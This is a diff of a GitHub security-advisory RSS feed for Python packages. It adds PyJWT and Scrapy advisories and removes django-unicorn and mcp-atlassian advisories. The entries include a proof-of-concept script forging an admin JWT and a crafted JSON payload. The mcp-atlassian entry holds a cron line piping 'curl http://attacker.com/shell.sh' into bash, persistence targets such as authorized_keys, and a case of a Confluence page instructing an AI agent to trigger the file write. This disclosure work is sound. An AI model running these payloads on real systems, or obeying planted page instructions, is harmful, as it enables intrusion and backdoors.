@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://xlordz.github.io/github-advisory-database-rss/pip.rss</id>
     <title>Security Advisory for Python packages hosted at PyPI.org</title>
-    <updated>2026-03-13T19:40:38.420Z</updated>
+    <updated>2026-03-13T20:46:00.411Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
     <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
@@ -11,6 +11,163 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[PyJWT] PyJWT accepts unknown `crit` header extensions]]></title>
+        <id>https://github.com/advisories/GHSA-752w-5fwx-jx9f</id>
+        <link href="https://github.com/advisories/GHSA-752w-5fwx-jx9f"/>
+        <updated>2026-03-13T20:05:05.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p>PyJWT does not validate the <code>crit</code> (Critical) Header Parameter defined in
+RFC 7515 §4.1.11. When a JWS token contains a <code>crit</code> array listing
+extensions that PyJWT does not understand, the library accepts the token
+instead of rejecting it. This violates the <strong>MUST</strong> requirement in the RFC.</p>
+<p>This is the same class of vulnerability as CVE-2025-59420 (Authlib),
+which received CVSS 7.5 (HIGH).</p>
+<hr>
+<h2 id="rfc-requirement">RFC Requirement</h2>
+<p>RFC 7515 §4.1.11:</p>
+<blockquote>
+<p>The "crit" (Critical) Header Parameter indicates that extensions to this
+specification and/or [JWA] are being used that <strong>MUST</strong> be understood and
+processed. [...] If any of the listed extension Header Parameters are
+<strong>not understood and supported</strong> by the recipient, then the <strong>JWS is invalid</strong>.</p>
+</blockquote>
+<hr>
+<h2 id="proof-of-concept">Proof of Concept</h2>
+<pre><code class="language-python">import jwt  # PyJWT 2.8.0
+import hmac, hashlib, base64, json
+
+# Construct token with unknown critical extension
+header = {"alg": "HS256", "crit": ["x-custom-policy"], "x-custom-policy": "require-mfa"}
+payload = {"sub": "attacker", "role": "admin"}
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
+
+h = b64url(json.dumps(header, separators=(",", ":")).encode())
+p = b64url(json.dumps(payload, separators=(",", ":")).encode())
+sig = b64url(hmac.new(b"secret", f"{h}.{p}".encode(), hashlib.sha256).digest())
+token = f"{h}.{p}.{sig}"
+
+# Should REJECT — x-custom-policy is not understood by PyJWT
+try:
+    result = jwt.decode(token, "secret", algorithms=["HS256"])
+    print(f"ACCEPTED: {result}")
+    # Output: ACCEPTED: {'sub': 'attacker', 'role': 'admin'}
+except Exception as e:
+    print(f"REJECTED: {e}")
+</code></pre>
+<p><strong>Expected:</strong> <code>jwt.exceptions.InvalidTokenError: Unsupported critical extension: x-custom-policy</code>
+<strong>Actual:</strong> Token accepted, payload returned.</p>
+<h3 id="comparison-with-rfc-compliant-library">Comparison with RFC-compliant library</h3>
+<pre><code class="language-python"># jwcrypto — correctly rejects
+from jwcrypto import jwt as jw_jwt, jwk
+key = jwk.JWK(kty="oct", k=b64url(b"secret"))
+jw_jwt.JWT(jwt=token, key=key, algs=["HS256"])
+# raises: InvalidJWSObject('Unknown critical header: "x-custom-policy"')
+</code></pre>
+<hr>
+<h2 id="impact">Impact</h2>
+<ul>
+<li><strong>Split-brain verification</strong> in mixed-library deployments (e.g., API
+gateway using jwcrypto rejects, backend using PyJWT accepts)</li>
+<li><strong>Security policy bypass</strong> when <code>crit</code> carries enforcement semantics
+(MFA, token binding, scope restrictions)</li>
+<li><strong>Token binding bypass</strong> — RFC 7800 <code>cnf</code> (Proof-of-Possession) can be
+silently ignored</li>
+<li>See CVE-2025-59420 for full impact analysis</li>
+</ul>
+<hr>
+<h2 id="suggested-fix">Suggested Fix</h2>
+<p>In <code>jwt/api_jwt.py</code>, add validation in <code>_validate_headers()</code> or
+<code>decode()</code>:</p>
+<pre><code class="language-python">_SUPPORTED_CRIT = {"b64"}  # Add extensions PyJWT actually supports
+
+def _validate_crit(self, headers: dict) -&gt; None:
+    crit = headers.get("crit")
+    if crit is None:
+        return
+    if not isinstance(crit, list) or len(crit) == 0:
+        raise InvalidTokenError("crit must be a non-empty array")
+    for ext in crit:
+        if ext not in self._SUPPORTED_CRIT:
+            raise InvalidTokenError(f"Unsupported critical extension: {ext}")
+        if ext not in headers:
+            raise InvalidTokenError(f"Critical extension {ext} not in header")
+</code></pre>
+<hr>
+<h2 id="cwe">CWE</h2>
+<ul>
+<li>CWE-345: Insufficient Verification of Data Authenticity</li>
+<li>CWE-863: Incorrect Authorization</li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://www.rfc-editor.org/rfc/rfc7515.html#section-4.1.11">RFC 7515 §4.1.11</a></li>
+<li><a href="https://osv.dev/vulnerability/GHSA-9ggr-2464-2j32">CVE-2025-59420 — Authlib crit bypass (CVSS 7.5)</a></li>
+<li><a href="https://www.rfc-editor.org/rfc/rfc7800">RFC 7800 — Proof-of-Possession Key Semantics</a></li>
+</ul>
+<h3 id="references-1">References</h3>
+<ul>
+<li><a href="https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f">https://github.com/jpadilla/pyjwt/security/advisories/GHSA-752w-5fwx-jx9f</a></li>
+<li><a href="https://github.com/advisories/GHSA-752w-5fwx-jx9f">https://github.com/advisories/GHSA-752w-5fwx-jx9f</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-752w-5fwx-jx9f</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-13T20:05:04.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[Scrapy] Scrapy: Arbitrary Module Import via Referrer-Policy Header in RefererMiddleware]]></title>
+        <id>https://github.com/advisories/GHSA-cwxj-rr6w-m6w7</id>
+        <link href="https://github.com/advisories/GHSA-cwxj-rr6w-m6w7"/>
+        <updated>2026-03-13T20:02:40.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
+<p>Since version 1.4.0, Scrapy respects the <code>Referrer-Policy</code> response header to decide whether and how to set a <code>Referer</code> header on follow-up requests.</p>
+<p>If the header value looked like a valid Python import path, Scrapy would import the referenced object and call it, assuming it referred to a referrer policy class (for example, <code>scrapy.spidermiddlewares.referer.DefaultReferrerPolicy</code>) and attempting to instantiate it to handle the <code>Referer</code> header.</p>
+<p>A malicious site could exploit this by setting <code>Referrer-Policy</code> to a path such as <code>sys.exit</code>, causing Scrapy to import and execute it and potentially terminate the process.</p>
+<h3 id="patches">Patches</h3>
+<p>Upgrade to Scrapy 2.14.2 (or later).</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you cannot upgrade to Scrapy 2.14.2, consider the following mitigations.</p>
+<ul>
+<li><strong>Disable the middleware:</strong> If you don't need the <code>Referer</code> header on follow-up requests, set <a href="https://docs.scrapy.org/en/latest/topics/spider-middleware.html#referer-enabled"><code>REFERER_ENABLED</code></a> to <code>False</code>.</li>
+<li><strong>Set headers manually:</strong> If you do need a <code>Referer</code>, disable the middleware and set the header explicitly on the requests that require it.</li>
+<li><strong>Set <code>referrer_policy</code> in request metadata:</strong> If disabling the middleware is not viable, set the <a href="https://docs.scrapy.org/en/latest/topics/spider-middleware.html#referrer-policy"><code>referrer_policy</code></a> request meta key on all requests to prevent evaluating preceding responses' <code>Referrer-Policy</code>. For example:</li>
+</ul>
+<pre><code class="language-python">Request(
+    url,
+    meta={
+        "referrer_policy": "scrapy.spidermiddlewares.referer.DefaultReferrerPolicy",
+    },
+)
+</code></pre>
+<p>Instead of editing requests individually, you can:</p>
+<ul>
+<li>implement a custom <a href="https://docs.scrapy.org/en/latest/topics/spider-middleware.html">spider middleware</a> that runs before the built-in referrer policy middleware and sets the <code>referrer_policy</code> meta key; or</li>
+<li>set the meta key in start requests and use the <a href="https://github.com/heylouiz/scrapy-sticky-meta-params">scrapy-sticky-meta-params</a> plugin to propagate it to follow-up requests.</li>
+</ul>
+<p>If you want to continue respecting legitimate <code>Referrer-Policy</code> headers while protecting against malicious ones, disable the built-in referrer policy middleware by setting it to <code>None</code> in <a href="https://docs.scrapy.org/en/latest/topics/settings.html#std-setting-SPIDER_MIDDLEWARES"><code>SPIDER_MIDDLEWARES</code></a> and replace it with the fixed implementation from Scrapy 2.14.2.</p>
+<p>If the Scrapy 2.14.2 implementation is incompatible with your project (for example, because your Scrapy version is older), copy the corresponding middleware from your Scrapy version, apply the same patch, and use that as a replacement.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-cwxj-rr6w-m6w7">https://github.com/scrapy/scrapy/security/advisories/GHSA-cwxj-rr6w-m6w7</a></li>
+<li><a href="https://github.com/scrapy/scrapy/commit/945b787a263586cb5803c01c6da57daad8997ae5">https://github.com/scrapy/scrapy/commit/945b787a263586cb5803c01c6da57daad8997ae5</a></li>
+<li><a href="https://github.com/advisories/GHSA-cwxj-rr6w-m6w7">https://github.com/advisories/GHSA-cwxj-rr6w-m6w7</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-cwxj-rr6w-m6w7</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-03-13T20:02:36.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[CairoSVG] CairoSVG vulnerable to Exponential DoS via recursive <use> element amplification]]></title>
         <id>https://github.com/advisories/GHSA-f38f-5xpm-9r7c</id>
@@ -635,143 +792,5 @@ except:
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-03-11T00:14:02.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[django-unicorn] django-unicorn affected by component state manipulation via unvalidated attribute access]]></title>
-        <id>https://github.com/advisories/GHSA-ffv6-jj46-x367</id>
-        <link href="https://github.com/advisories/GHSA-ffv6-jj46-x367"/>
-        <updated>2026-03-11T05:45:51.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>Component state manipulation is possible in <code>django-unicorn</code> due to missing access control checks during property updates and method calls. An attacker can bypass the intended <code>_is_public</code> protection to modify internal attributes such as <code>template_name</code> or trigger protected methods.</p>
-<h2 id="vulnerability-details-component-access-control-bypass">Vulnerability Details: Component Access Control Bypass</h2>
-<p>Security analysis identified that the framework fails to enforce visibility boundaries defined by <code>_is_public</code> within the action parsers. Specifically, the logic in <code>set_property_value()</code> and <code>_call_method_name()</code> utilizes <code>getattr</code> and <code>setattr</code> directly on component instances without verifying if the target attribute or method is explicitly marked as public.</p>
-<p>Vulnerability resides in:</p>
-<ul>
-<li><code>src/django_unicorn/views/action_parsers/call_method.py</code></li>
-<li><code>src/django_unicorn/views/action_parsers/utils.py</code></li>
-</ul>
-<p>While Django's template engine restricts rendering to registered directories, an unauthorized user can still force a component to render sensitive templates (e.g., admin layouts) from other installed applications or reset the component state by invoking the internal <code>reset()</code> method.</p>
-<h2 id="proof-of-concept-poc">Proof of Concept (PoC)</h2>
-<p>Attacker can overwrite the <code>template_name</code> attribute by sending a crafted JSON payload to the message endpoint:</p>
-<ol>
-<li>Construct a payload targeting a protected attribute:<pre><code class="language-json">{
-  "actionQueue": [
-    {
-      "type": "syncInput",
-      "payload": { "name": "template_name", "value": "admin/base.html" }
-    }
-  ],
-  "data": {},
-  "meta": "&lt;checksum_of_empty_dict&gt;"
-}
-</code></pre>
-</li>
-<li>The server-side component updates its internal state: <code>self.template_name = "admin/base.html"</code>.</li>
-<li>Subsequent re-rendering displays the content of the targeted template, bypassing intended component logic.</li>
-</ol>
-<h2 id="impact">Impact</h2>
-<p>Low severity. The risk is limited to unauthorized manipulation of component state and rendering of existing templates within the application's configured template directories. Remote Code Execution (RCE) is not possible via this vector.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/django-commons/django-unicorn/security/advisories/GHSA-ffv6-jj46-x367">https://github.com/django-commons/django-unicorn/security/advisories/GHSA-ffv6-jj46-x367</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-31815">https://nvd.nist.gov/vuln/detail/CVE-2026-31815</a></li>
-<li><a href="https://github.com/advisories/GHSA-ffv6-jj46-x367">https://github.com/advisories/GHSA-ffv6-jj46-x367</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-ffv6-jj46-x367</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-03-11T00:11:08.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[mcp-atlassian] MCP Atlassian has an arbitrary file write leading to arbitrary code execution via unconstrained download_path in confluence_download_attachment]]></title>
-        <id>https://github.com/advisories/GHSA-xjgw-4wvw-rgm4</id>
-        <link href="https://github.com/advisories/GHSA-xjgw-4wvw-rgm4"/>
-        <updated>2026-03-10T18:56:11.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>The <code>confluence_download_attachment</code> MCP tool accepts a <code>download_path</code> parameter that is written to without any directory boundary enforcement. An attacker who can call this tool and supply or access a Confluence attachment with malicious content can write arbitrary content to any path the server process has write access to. Because the attacker controls both the write destination and the written content (via an uploaded Confluence attachment), this constitutes for arbitrary code execution (for example, writing a valid cron entry to <code>/etc/cron.d/</code> achieves code execution within one scheduler cycle with no server restart required).</p>
-<h3 id="details">Details</h3>
-<p>The tool parameter is defined in <code>src/mcp_atlassian/servers/confluence.py:~1275</code> without any path restriction:</p>
-<pre><code class="language-python">download_path: Annotated[
-    str,
-    Field(
-        description=(
-            "Full path where the file should be saved. Can be absolute or relative. "
-            "Examples: './downloads/report.pdf', '/tmp/image.png', 'C:\\\\temp\\\\file.docx'. "
-            "Parent directory will be created if it doesn't exist."
-        )
-    ),
-],
-
- The implementation at src/mcp_atlassian/confluence/attachments.py:183–200:
-
-if not os.path.isabs(target_path):
-    target_path = os.path.abspath(target_path)  # normalizes path, no restriction
-
-os.makedirs(os.path.dirname(target_path), exist_ok=True)  # creates any directory
-with open(target_path, "wb") as f:                        # writes to any writable path
-    for chunk in response.iter_content(chunk_size=8192):
-        f.write(chunk)
-
- os.path.abspath() converts relative paths to absolute but performs no directory boundary check. No configurable base download directory is enforced. There is no validation between the tool parameter and the file write. The same issue exists in download_content_attachments via its target_dir parameter (src/mcp_atlassian/servers/confluence.py:~1389).
-
-
-### PoC
-Prerequisites: Confluence credentials with access to at least one page. To control the written file content, upload a malicious attachment to any Confluence page you have write access to.
-
-Step 1 — Prepare the payload. Create a file containing a valid cron entry and upload it as a Confluence attachment:
-
-* * * * * root curl http://attacker.com/shell.sh | bash
-
-Step 2 — Call the tool with a sensitive write target:
-
-{
-    "jsonrpc": "2.0",
-    "method": "tools/call",
-    "params": {
-        "name": "confluence_download_attachment",
-        "arguments": {
-            "page_id": "&lt;page id hosting the malicious attachment&gt;",
-            "attachment_id": "&lt;attachment id&gt;",
-            "download_path": "/etc/cron.d/mcp-backdoor"
-        }
-    },
-    "id": 1
-}
-
-The attachment content is written verbatim to /etc/cron.d/mcp-backdoor. The system scheduler executes it within one minute with no further attacker action required.
-
-Alternative potential write targets demonstrating broader impact:
-- /home/&lt;user&gt;/.ssh/authorized_keys - persistent SSH backdoor
-- &lt;venv&gt;/lib/python3.x/site-packages/&lt;any_imported_module&gt;.py - code execution on next import
-- ~/.bashrc - code execution on next user login
-
-### Impact
-An attacker who can invoke MCP tools and upload (or access) a Confluence attachment with controlled content can achieve arbitrary code execution on the server host. The MCP HTTP transport endpoints carry no authentication by default, meaning any host that can reach the server's HTTP port can call tools using the server's own embedded Confluence credentials (global fallback). The default HOST=0.0.0.0 binding makes this reachable from the local network without any configuration change.
-
-In enterprise deployments where Confluence write access is broadly granted, the effective attacker prerequisite reduces to network access to the MCP HTTP port. This is also reachable without direct network access: a malicious Confluence page can embed LLM instructions directing an AI agent to call confluence_download_attachment with attacker-specified parameters, achieving code execution through the agent as an unwitting intermediary.
-
-Example potential RCE paths:
- 1. Cron job injection - write a cron entry to /etc/cron.d/; executes within one scheduler cycle, no restart required
- 2. Python package hijack - overwrite any .py module in the application's virtual environment; executes on next import or server restart.
- 3. SSH authorized_keys - write an attacker-controlled public key; grants persistent interactive shell access.
- 4. Shell profile injection - write to ~/.bashrc or ~/.profile; executes on next user login.
-### References
-
-- &lt;https://github.com/sooperset/mcp-atlassian/security/advisories/GHSA-xjgw-4wvw-rgm4&gt;
-- &lt;https://github.com/sooperset/mcp-atlassian/commit/52b9b0997681e87244b20d58034deae89c91631e&gt;
-- &lt;https://github.com/advisories/GHSA-xjgw-4wvw-rgm4&gt;
-</code></pre>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-xjgw-4wvw-rgm4</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-03-10T18:56:07.000Z</published>
     </entry>
 </feed>
